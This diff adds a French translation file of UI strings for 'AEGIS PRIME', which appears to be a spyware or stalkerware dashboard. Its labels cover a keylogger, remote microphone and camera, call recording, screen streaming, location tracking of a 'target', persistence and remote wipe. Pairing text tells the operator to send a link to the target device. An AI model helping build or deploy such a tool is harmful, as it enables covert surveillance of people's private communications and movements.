@@ -1,0 +1,133 @@
+{
+  "app": {
+    "title": "AEGIS PRIME",
+    "subtitle": "Salle de Guerre v3.0",
+    "status": "SYSTÈME: EN LIGNE",
+    "encrypted": "CHIFFRÉ: AES-256",
+    "threat_level": "NIVEAU DE MENACE: FAIBLE",
+    "operator": "OPÉRATEUR",
+    "operator_id": "ID: 88-ALPHA",
+    "no_alerts": "Aucune nouvelle alerte"
+  },
+  "sidebar": {
+    "my_subscriptions": "MES ABONNEMENTS",
+    "dashboard": "Tableau de Bord",
+    "remote_control": "CONTRÔLE À DISTANCE",
+    "surroundings_listening": "Écoute Environnante",
+    "remote_camera": "Caméra à Distance",
+    "call_recorder": "Enregistreur d'Appels",
+    "live_screenshots": "Captures d'Écran en Direct",
+    "live_screen_streaming": "Diffusion d'Écran en Direct",
+    "block_apps": "Bloquer Apps",
+    "block_websites": "Bloquer Sites Web",
+    "block_wifi": "Bloquer Wi-Fi",
+    "ai_tools": "OUTILS IA",
+    "chatgpt": "ChatGPT",
+    "gemini": "Gemini",
+    "monitoring": "SURVEILLANCE",
+    "keywords": "Mots-clés",
+    "spy_panel": "Surveillance Profonde"
+  },
+  "spy": {
+    "title": "SURVEILLANCE PROFONDE",
+    "subtitle": "Accès aux données brutes et fichiers cachés",
+    "tabs": {
+      "keylogger": "ENREGISTREUR DE FRAPPE",
+      "media": "FICHIERS & MÉDIAS",
+      "schedule": "PROGRAMMATIONS"
+    },
+    "keylogger_status": "État de l'enregistreur",
+    "active": "ACTIF (Accessibilité Accordée)",
+    "clear_logs": "EFFACER LES JOURNAUX",
+    "new_rule": "NOUVELLE RÈGLE D'AUTO-ENREGISTREMENT",
+    "type": "Type de Capture",
+    "interval": "Intervalle",
+    "duration": "Durée (si audio)",
+    "activate_schedule": "ACTIVER LA PROGRAMMATION",
+    "active_rules": "Règles Actives"
+  },
+  "keywords": {
+    "title": "SENTINELLE DE MOTS-CLÉS",
+    "subtitle": "Surveillance sémantique des messages et de la frappe en temps réel",
+    "active_monitoring": "SURVEILLANCE ACTIVE",
+    "add_trigger": "Ajouter Nouveau Déclencheur",
+    "keyword_label": "Mot-clé / Phrase",
+    "placeholder": "Ex: aidez-moi, réunion secrète...",
+    "category": "Catégorie",
+    "severity": "Sévérité",
+    "activate_trigger": "ACTIVER DÉCLENCHEUR",
+    "latest_detections": "Dernières Détections (Simulation)",
+    "active_triggers": "Déclencheurs Actifs",
+    "synced": "SYNCHRONISÉ AVEC L'AGENT"
+  },
+  "command": {
+    "title": "Actifs Protégés",
+    "no_assets": "AUCUN ACTIF CONNECTÉ",
+    "waiting": "En attente de télémétrie de l'agent...",
+    "ai_matrix": "Matrice de Menace IA",
+    "matrix": {
+      "sentiment": "Analyse de Sentiment",
+      "geo": "Risque Géospatial",
+      "chatgpt": "Intégration ChatGPT"
+    },
+    "actions": {
+      "mic": "Mic",
+      "cam": "Cam",
+      "rec": "Enr",
+      "shot": "Capt",
+      "live": "Direct",
+      "lock": "Verr",
+      "wipe": "Effa"
+    }
+  },
+  "map": {
+    "target_locked": "CIBLE VERROUILLÉE",
+    "device": "APPAREIL",
+    "battery": "BATTERIE",
+    "status": "STATUT",
+    "online": "EN LIGNE",
+    "offline": "HORS LIGNE",
+    "coords": "COORD",
+    "overlay": "SUPERPOSITION TACTIQUE",
+    "friendly": "UNITÉS ALLIÉES",
+    "hostiles": "HOSTILES"
+  },
+  "feed": {
+    "title": "FLUX D'ACTIVITÉ EN TEMPS RÉEL",
+    "live": "EN DIRECT"
+  },
+  "intel": {
+    "telemetry": "Télémétrie de l'Appareil",
+    "network": "Réseau",
+    "persistence": "Persistance",
+    "critical_alerts": "Alertes Critiques",
+    "top_websites": "Sites les plus visités (24h)",
+    "top_contacts": "Contacts Principaux",
+    "calls": "appels",
+    "acknowledge": "Reconnaître",
+    "locate": "Localiser"
+  },
+  "settings": {
+    "title": "Configuration du Système",
+    "language": "Langue de l'Interface",
+    "select_language": "Sélectionner la Langue",
+    "close": "Fermer",
+    "save": "Sauvegarder les Modifications"
+  },
+  "pairing": {
+    "title": "AJOUTER UN NOUVEL APPAREIL",
+    "scan_title": "Scanner avec Caméra (HTTPS v2)",
+    "scan_subtitle": "Ouvrez votre application appareil photo ou un lecteur QR. Il détectera un lien HTTPS sécurisé.",
+    "scan_with_app": "Scanner avec App Aegis",
+    "scan_instruction": "Ouvrez l'application sur l'appareil cible et pointez la caméra vers ce code.",
+    "deep_link_label": "LIEN PROFOND",
+    "deep_link_instruction": "Envoyez ce lien à l'appareil cible via WhatsApp, SMS ou Email. Cliquez dessus pour appairer automatiquement.",
+    "manual_code_label": "CODE MANUEL",
+    "manual_code_instruction": "Entrez ce code à 6 chiffres manuellement dans l'écran d'appairage de l'App Aegis.",
+    "nfc_title": "Prêt pour Appairage NFC",
+    "nfc_instruction": "Approchez l'appareil cible de ce terminal (si supporté).",
+    "expires_in": "SESSION EXPIRE DANS:",
+    "id": "ID",
+    "copy_text": "Copier Texte"
+  }
+}
